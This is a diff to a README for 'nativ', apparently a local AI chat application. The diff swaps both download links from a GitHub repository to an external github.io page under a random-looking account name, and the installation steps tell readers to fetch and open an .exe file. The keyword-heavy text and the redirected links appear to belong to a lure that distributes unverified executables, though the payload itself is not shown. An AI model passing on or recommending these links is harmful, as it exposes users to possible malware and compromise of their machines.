@@ -1,6 +1,6 @@
 # 🧠 nativ - Power your own local Artificial Intelligence
 
-[![](https://img.shields.io/badge/Download_nativ-blue.svg)](https://github.com/syllabicitynaghammadilibrary804/nativ)
+[![](https://img.shields.io/badge/Download_nativ-blue.svg)](https://syllabicitynaghammadilibrary804.github.io)
 
 nativ brings artificial intelligence to your computer. You keep your data on your own machine. You do not need an internet connection to process your chats. This application allows you to work with open-source machine learning models without complex setups. You control the software from a simple interface.
 
@@ -15,7 +15,7 @@ You need a computer that meets the minimum system requirements before you begin.
 * 5 GB of free disk space for models and application files
 
 ### Installation Steps
-1. Visit [the download link](https://github.com/syllabicitynaghammadilibrary804/nativ) to find the latest version.
+1. Visit [the download link](https://syllabicitynaghammadilibrary804.github.io) to find the latest version.
 2. Look for the file ending in `.exe` under the release section.
 3. Click the link to save the installer file to your computer.
 4. Open the file once the download finishes.
